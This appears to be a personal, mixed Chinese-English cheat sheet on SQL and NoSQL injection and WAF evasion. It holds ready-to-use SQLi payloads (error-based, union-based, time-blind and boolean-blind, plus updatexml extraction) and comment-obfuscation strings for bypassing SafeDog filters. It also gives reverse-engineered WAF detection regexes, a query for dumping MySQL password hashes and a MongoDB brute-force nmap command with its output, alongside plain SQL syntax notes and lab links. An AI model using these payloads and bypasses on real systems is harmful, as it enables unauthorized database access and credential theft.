# TMP

```py
Different DB , Different syntax => SQL
Easy2Sqlmap,Hard2Bypass

框架过滤，WAF流量过滤

Framework & Waf

laravel  pdo function 
regex
\b(ALTER|CREATE|DELETE|DROP|EXEC(UTE){0,1}|INSERT( +INTO){0,1}|MERGE|SELECT|UPDATE|UNION( +ALL){0,1})\b

waf safedog bin dump rules
regex

waf-filter:
regex | eng rules | ml

id=4' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178787671,(SELECT (ELT(2556=2556,1))),0x71627a6a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'JOtO'='JOtO

php?id=200'+and(/*60000select*/1)-(/*!32001select*/0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+and 0 union select 1, version(), 3,4,5,6,7,8,9 --+

已知规则源码，逆向分析
(\b|\\N|\d*(e\s?|e\-|e\+)\d+|\d+\.\d*|\d*\.\d+|\d*)union(\s*\S+|(\s+\w+\s*)+|\s+all|\s+distinctrow|\s+distinct|\(*|\s*\S+\s*\S+)(\s+|[\(\s]*)select.*

(\)|\b|\d+)order(#*\s+\S*\s*\S*\s*)by\b

(#|;|'|\)|\d|\s)+(\s*/*\s*)(\band\b|\bor\b|\bhaving\b|&&|&|\bxor\b)(\s*/*\s*)(#|\s|!|\()*!*-*'*(false|true|\d+|\(ascii.{1,20}=|\(length.{1,20}=)\b
Fuzz (rules)

x x x => x
1 x => 0.5

Sqli-Labs:
how to install:
sudo docker run -dt --name sqli -p 80:80 --rm acgpiano/sqli-labs

Sqlmap:
https://github.com/needle-wang/sqlmap-gtk

Prerequisites
python3.6+, GTK+3.20 above(linux has contained)
pygobject: (choose one)
apt-get install python3-gi(suggestion)
pip3 install PyGObject
requests: pip3 install requests

找可能的注入点：

get index.html

后端有交互的点
request method get post  ...
get/post/header

index.php?id=1' and updatexml(1,concat(0x7e,database(),0x7e,user(),0x7e,@@datadir),1)#


google dork
SqlInjectType: 
In-band SQLi (Classic SQLi)
Error-based SQLi
id=4' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7178787671,(SELECT (ELT(2556=2556,1))),0x71627a6a71,0x78))s), 8446744073709551610, 8446744073709551610))) AND 'JOtO'='JOtO
Union-based SQLi
id=-7810' UNION ALL SELECT NULL,CONCAT(0x7171627a71,0x415449484d526167596a77484c6e47775644794b4b7048756b6b47746472536a4c58694471634d65,0x7171787171),NULL--
Time-based Blind SQLi
id=4' AND (SELECT 5114 FROM (SELECT(SLEEP(2))) AS RezN) AND 'vULj'='vULj
Boolean-based Blind SQLi
id=1' AND 5957=5957 AND 'DFUZ'='DFUZ
Stacked injections
;
SQL:
數據類型：
https://www.w3schools.com/sql/sql_datatypes.asp

注释：
id=1 OR SLEEP(25)=0 LIMIT 1--
--
/**/

创建数据库：
CREATE DATABASE databasename;

删除数据库：
DROP DATABASE databasename;

数据库备份：
BACKUP DATABASE databasename
TO DISK = 'filepath';

数据库差异备份：
BACKUP DATABASE databasename
TO DISK = 'filepath'
WITH DIFFERENTIAL;

创建表：
CREATE TABLE table_name (
	column1 datatype,
	column2 datatype,
	column3 datatype,
   ....
);

CREATE TABLE duser(id int,username VARCHAR(100),pass VARCHAR(20));

删除表：
DROP TABLE table_name;

增删改表：
ALTER TABLE table_name
ADD column_name datatype;

ALTER TABLE table_name
DROP COLUMN column_name;

ALTER TABLE table_name
MODIFY COLUMN column_name datatype;

ALTER TABLE table_name
MODIFY column_name datatype;

ALTER TABLE table_name
ALTER COLUMN column_name datatype;

插入数据：
INSERT INTO table_name (column1, column2, column3, ...)
VALUES (value1, value2, value3, ...);

INSERT INTO deelmind.duser(id,username,pass) VALUES(3,"username3","pass3");

INSERT INTO table2 (column1, column2, column3, ...)
SELECT column1, column2, column3, ...
FROM table1
WHERE condition;

更新数据：
UPDATE table_name
SET column1 = value1, column2 = value2, ...
WHERE condition;

查询数据：
SELECT * FROM X
SELECT DISTINCT * FROM X  去重
SELECT * FROME WHERE

Where:
运算符	描述
=	等于
<>	不等于。注释：在 SQL 的一些版本中，该操作符可被写成 !=
>	大于
<	小于
>=	大于等于
<=	小于等于
BETWEEN	在某个范围内
LIKE	搜索某种模式
IN	指定针对某个列的多个可能值

ORDER BY 
FUNCTIONS count min max sum …
AS
EXISTS
JOIN
ONION
SELECT DISTINCT
WHERE
AND & &&
OR | ||
(1=1)=1
Mysql:
注释：
#

登录：
mysql -h ip -u user -p pass

select top:
limit number


常量：
显示版本：select version();
显示字符集：select @@character_set_database;
显示计算机名：select @@hostname;
显示系统版本：select @@version_compile_os;
显示mysql路径：select @@basedir;
显示数据库路径：select @@datadir;
显示root密码：select User,Password from mysql.user;

联合注入：
报错注入：
布尔盲注：
时间盲注：
其它注入：
OOB: out of band
unc
http://dnslog.cn/

正则表达式：
https://regex101.com/


Bypass:
safedog:

dump rules
view rules
bypass
filters url > IsSqlInjection()

and/*%"!/*/

filter

and/

and 

/*%"!/*/and/*%"!/*/
/*%"/!*/select
/*%/!"*/union
/*%/"!*/sleep()
/*!%"/*/
/*!%/"*/
/*!"%/*/
/*!"/%*/
/*!/%"*/
/*!/"%*/
/*"%!/*/
/*"%/!*/
/*"!%/*/
/*"!/%*/


二次注入：
https://github.com/HoangKien1020/Joomla-SQLinjection


参数污染：

Web Application Server Backend	Parsing Result	Example
ASP.NET / IIS	All occurrences concatenated with a comma	color=red,blue
ASP / IIS	All occurrences concatenated with a comma	color=red,blue
.NET Core 3.1 / Kestrel	All occurrences concatenated with a comma	color=red,blue
.NET 5 / Kestrel	All occurrences concatenated with a comma	color=red,blue
PHP / Apache	Last occurrence only	color=blue
PHP / Zeus	Last occurrence only	color=blue
JSP, Servlet / Apache Tomcat	First occurrence only	color=red
JSP, Servlet / Oracle Application Server 10g	First occurrence only	color=red
JSP, Servlet / Jetty	First occurrence only	color=red
IBM Lotus Domino	Last occurrence only	color=blue
IBM HTTP Server	First occurrence only	color=red
node.js / express	First occurence only	color=red
mod_perl, libapreq2 / Apache	First occurrence only	color=red
Perl CGI / Apache	First occurrence only	color=red
mod_wsgi (Python) / Apache	First occurrence only	color=red
Python / Zope	All occurrences in List data type	color=[‘red’,’blue’]



https://vimeo.com/398763205

绕过&总结：
sqlmap critical
加tamper

不同SQL语句
空字符
宽字符
冗余流量
注释 /*  */  -- # 
inline注释 /*!version  code  */
URL encode
‘ -> %df%27
addslashes
mysql_real_escape_string


https://docs.google.com/document/d/1b4ggz9ijhu0TJ_3F4ncgPxpbZKVedtpDiqKB9R40sXM/edit#heading=h.cxf4xsbdot3s

Sql Server:
查询数据库
select * from sysdatabases;
use dbname;

查询表
select * from sysobjects where xtype='U';
xtype='U':表示所有用户表，xtype='S':表示所有系统表。

select top:
top number

Oracle:
登录：
sqlplus /nolog
connect SYS as sysdba
show user

创建数据库：
CREATE TABLESPACE data01
DATAFILE 'database.dbf' SIZE 500M

由于Oralce没有库名,只有表空间,所以Oracle没有提供数据库名称查询支持，只提供了表空间名称查询:
select * from v$tablespace;
select instance_name from v$instance; //查看当前使用的数据库

查询当前数据库中所有表名:
select * from user_tables;

查看用户权限：
select * from dba_roles;

Select Top:
ORDER BY id FETCH FIRST 1 ROWS ONLY

Sqlilab:
$id = '"'.$id.'"';
$sql="SELECT * FROM users WHERE id=$id LIMIT 0,1";

SELECT * FROM users WHERE id="and 1=1" LIMIT 0,1



NoSql:


show databases;
show dbs;

use db;

show tables;
show collections;


use test;
db.admin.insert( { id:1,name:"name1",age:1 } )
db.admin.insertOne({ id:2,name:"name2",age:2 })
db.admin.insertMany([{ id:3,name:"name3",age:3 },{ id:4,name:"name4",age:4 }])

db.admin.find()
db.admin.find({id:1})
db.admin.findOne()

db.admin.remove({id:2})
db.admin.deleteOne()
db.admin.deleteMany()

db.admin.drop()

db.user.update( {"name":"name1" }, {$set: {age:99} })
db.user.updateMany( {"name":"name1" }, {$set: {age:99} })

db.dropDatabase()

https://docs.mongodb.com/manual/reference/method/db.createUser/

db.createUser( {user: "admin",pwd: "123456",roles: [ { role: "userAdminAnyDatabase", db: "admin" } ]})
use admin
db.auth("admin","123456")


暴力破解：

nmap -p 27017 <ip> --script mongodb-brute
Script Output
PORT      STATE SERVICE
27017/tcp open  mongodb
| mongodb-brute:
|   Accounts
|     root:Password1 - Valid credentials
|   Statistics
|_    Performed 3542 guesses in 9 seconds, average tps: 393



https://github.com/digininja/nosqlilab
https://github.com/Charlie-belmer/nosqli
https://github.com/codingo/NoSQLMap




NoSqlMap
https://github.com/codingo/NoSQLMap
```


